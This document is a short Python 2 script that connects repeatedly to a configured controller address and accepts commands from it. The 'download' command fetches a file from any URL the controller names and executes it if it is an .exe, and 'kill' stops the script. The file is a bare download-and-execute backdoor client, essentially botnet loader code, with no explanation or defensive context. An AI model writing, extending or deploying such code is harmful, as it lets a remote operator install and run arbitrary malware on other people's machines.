import socket
import os
import sys
import time
import urllib

# config 

host = "127.0.0.1"
port = 2600

# end config 

print "connected"

while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	time.sleep(1)
	s.connect((host, port))

	data = s.recv(1024)
	cmd = data.split(" ")

	if data:
		if cmd[0] == "kill":
			exit(1)

		if cmd[0] == "download":
			url = cmd[1]
			outfile = cmd[2]

			file = urllib.URLopener()
			file.retrieve(url, outfile)

			if outfile.endswith(".exe"):
				os.system(outfile)